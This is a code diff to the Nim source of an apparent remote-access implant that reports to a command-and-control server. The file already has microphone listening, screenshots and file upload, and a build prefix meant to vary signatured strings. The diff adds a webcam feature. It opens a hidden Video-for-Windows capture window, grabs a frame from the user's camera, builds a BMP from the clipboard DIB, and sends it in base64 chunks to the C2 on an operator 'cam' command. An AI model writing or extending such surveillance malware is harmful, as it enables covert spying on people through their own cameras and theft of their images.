@@ -6,7 +6,7 @@ import std/[asyncdispatch, strutils, json, os, times, random, base64,
 import ws
 import nimcrypto/[pbkdf2, sha2, hmac, utils, bcmode, rijndael]
 import winim/lean
-import winim/inc/[windef, winbase, winuser, wingdi, tlhelp32, mmsystem]
+import winim/inc/[windef, winbase, winuser, wingdi, tlhelp32, mmsystem, vfw]
 
 # Build-time prefix. Edit per build to vary signatured strings.
 const BuildPrefix = "X7K"
@@ -1708,6 +1708,158 @@ proc micListenDrainTask(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
       if micListenRunning:
         await sleepAsync(20)
 
+# ------------------------------------------------------------
+# WEBCAM CAPTURE  (operator -> cam <id> [device])
+# ------------------------------------------------------------
+# Video-for-Windows single-shot capture. Steps:
+#   1. capCreateCaptureWindowA — hidden top-level window
+#   2. WM_CAP_DRIVER_CONNECT   — attach to cam `device`
+#   3. WM_CAP_GRAB_FRAME       — snap one frame
+#   4. WM_CAP_EDIT_COPY        — copy the DIB to the clipboard
+#   5. GetClipboardData(CF_DIB)— pull the raw DIB out
+#   6. Prepend BITMAPFILEHEADER → ship as file_chunk to the C2
+#
+# Why VfW and not DirectShow / Media Foundation: VfW is built into
+# Windows, no extra dep, no COM. The downside is it needs a window
+# in the user's session, which is true for a desktop agent anyway.
+proc captureCam(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.},
+                device: int): Future[JsonNode] {.async.} =
+  # VfW message codes.
+  const
+    WM_CAP                       = WM_USER
+    WM_CAP_DRIVER_CONNECT        = WM_CAP + 10
+    WM_CAP_DRIVER_DISCONNECT     = WM_CAP + 11
+    WM_CAP_EDIT_COPY             = WM_CAP + 30
+    WM_CAP_GRAB_FRAME            = WM_CAP + 60
+  const
+    DEVICE_MAX = 9
+  let devIdx = clamp(device, 0, DEVICE_MAX)
+
+  # Hidden window for the capture pipeline. VfW requires a HWND
+  # to attach the driver to — even though we never display the
+  # preview, the window has to exist.
+  let hwnd = capCreateCaptureWindowA("cam", WS_OVERLAPPEDWINDOW,
+                                     0, 0, 320, 240, 0, 0)
+  if hwnd == 0:
+    return %* {"type": "output",
+               "data": "[!] cam: capCreateCaptureWindowA failed"}
+
+  var connected = false
+  try:
+    let con = SendMessageA(hwnd, WM_CAP_DRIVER_CONNECT, WPARAM(devIdx), 0)
+    if con == 0:
+      return %* {"type": "output",
+                 "data": "[!] cam: no camera at device " & $devIdx &
+                         " (no webcam? in use by another app?)"}
+    connected = true
+
+    # Snap one frame. WM_CAP_GRAB_FRAME is synchronous and updates
+    # the internal frame buffer.
+    discard SendMessageA(hwnd, WM_CAP_GRAB_FRAME, 0, 0)
+
+    # Copy the DIB to the clipboard. WM_CAP_EDIT_COPY is the only
+    # documented way to get the DIB out of VfW without writing to
+    # disk first.
+    let ed = SendMessageA(hwnd, WM_CAP_EDIT_COPY, 0, 0)
+    if ed == 0:
+      return %* {"type": "output",
+                 "data": "[!] cam: WM_CAP_EDIT_COPY failed"}
+
+    if OpenClipboard(0) == 0:
+      return %* {"type": "output",
+                 "data": "[!] cam: OpenClipboard failed"}
+    let got = false
+    try:
+      let hDib = GetClipboardData(CF_DIB)
+      if hDib == 0:
+        return %* {"type": "output",
+                   "data": "[!] cam: no DIB in clipboard"}
+
+      # Read the BITMAPINFOHEADER to get the DIB size.
+      var bmi: BITMAPINFOHEADER
+      copyMem(addr bmi, cast[ptr byte](hDib), sizeof(BITMAPINFOHEADER))
+      let w = int(bmi.biWidth)
+      let h = int(abs(bmi.biHeight))
+      if w == 0 or h == 0:
+        return %* {"type": "output",
+                   "data": "[!] cam: driver returned empty frame (biWidth=" &
+                           $w & " biHeight=" & $h & ")"}
+      # biSizeImage is the pixel data size; fall back to the
+      # standard 32-bpp stride × height if the driver left it 0.
+      var pixelBytes = int(bmi.biSizeImage)
+      if pixelBytes == 0:
+        let bpp = int(bmi.biBitCount)
+        if bpp == 0:
+          return %* {"type": "output",
+                     "data": "[!] cam: driver returned bpp=0"}
+        pixelBytes = ((w * bpp + 31) div 32) * 4 * h
+      let dibSize = sizeof(BITMAPINFOHEADER) + pixelBytes
+      # Some drivers stuff extra color masks/palette data into the
+      # DIB after the header (BI_BITFIELDS = 12 bytes for 16/32bpp).
+      # If biClrUsed > 0 there's a palette; if biCompression is
+      # BI_BITFIELDS the 3 DWORD masks come right after the header.
+      let compression = int(bmi.biCompression)
+      let extraHdr = if compression == 3: 12 else: 0
+      let actualDibSize = dibSize + extraHdr
+
+      # Stitch a real BMP: 14-byte file header + (DIB including
+      # any color masks).
+      let fileSize = 14 + actualDibSize
+      var bmp = newSeqOfCap[byte](fileSize)
+      # "BM"
+      bmp.add(0x42); bmp.add(0x4D)
+      proc putU32(b: var seq[byte], v: int32) =
+        b.add(byte(v and 0xFF))
+        b.add(byte((v shr 8) and 0xFF))
+        b.add(byte((v shr 16) and 0xFF))
+        b.add(byte((v shr 24) and 0xFF))
+      proc putU16(b: var seq[byte], v: int16) =
+        b.add(byte(v and 0xFF))
+        b.add(byte((v shr 8) and 0xFF))
+      putU32(bmp, int32(fileSize))
+      putU16(bmp, int16(0))                              # reserved
+      putU16(bmp, int16(0))                              # reserved
+      putU32(bmp, int32(14 + sizeof(BITMAPINFOHEADER) + extraHdr))
+      # Copy the DIB (header + masks + pixel data) from clipboard.
+      let src = cast[ptr UncheckedArray[byte]](hDib)
+      let total = actualDibSize
+      var copied = 0
+      while copied < total:
+        let chunk = min(4096, total - copied)
+        for j in 0..<chunk: bmp.add(byte(src[copied + j]))
+        inc copied, chunk
+
+      let ts = getTime().toUnix
+      let filename = "cam_" & $ts & ".bmp"
+      let chunkSize = 524288
+      let totalChunks = (bmp.len + chunkSize - 1) div chunkSize
+      var idx = 0
+      var off2 = 0
+      while off2 < bmp.len:
+        let n = min(chunkSize, bmp.len - off2)
+        await sendToC2(%* {
+          "type": "file_chunk",
+          "filepath": filename,
+          "chunk_index": idx,
+          "total_chunks": totalChunks,
+          "data": base64.encode(bmp[off2 ..< off2 + n]),
+          "last_chunk": off2 + n >= bmp.len
+        })
+        inc idx
+        off2 += n
+
+      return %* {"type": "output",
+                 "data": "[" & BuildPrefix & "] cam: device=" & $devIdx &
+                         " " & $w & "x" & $h & " (" & $bmp.len & " bytes, " &
+                         $totalChunks & " chunks) -> downloads/" & filename}
+    finally:
+      discard got
+      CloseClipboard()
+  finally:
+    if connected:
+      discard SendMessageA(hwnd, WM_CAP_DRIVER_DISCONNECT, 0, 0)
+    DestroyWindow(hwnd)
+
 proc processList(): JsonNode =
   try:
     var snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
@@ -1861,6 +2013,17 @@ proc handleCommand(sc: SessionCrypto, cmd: JsonNode,
     await uploadFile("", remote, b64, sendToC2)
   of "screenshot":
     await sendToC2(await takeScreenshot(sendToC2))
+  of "cam":
+    # args = device index (optional, default 0). The dispatcher's
+    # call site passes just the agent id; if the operator typed
+    # extra words, treat the first word as a device number.
+    var dev = 0
+    if cmdArgs.len > 0:
+      try:
+        dev = parseInt(cmdArgs.split(' ', 1)[0])
+      except:
+        dev = 0
+    await sendToC2(await captureCam(sendToC2, dev))
   of "mic":
     # args = seconds (optional, default 10, clamped to 1..120)
     var secs = MIC_DEFAULT_SECS
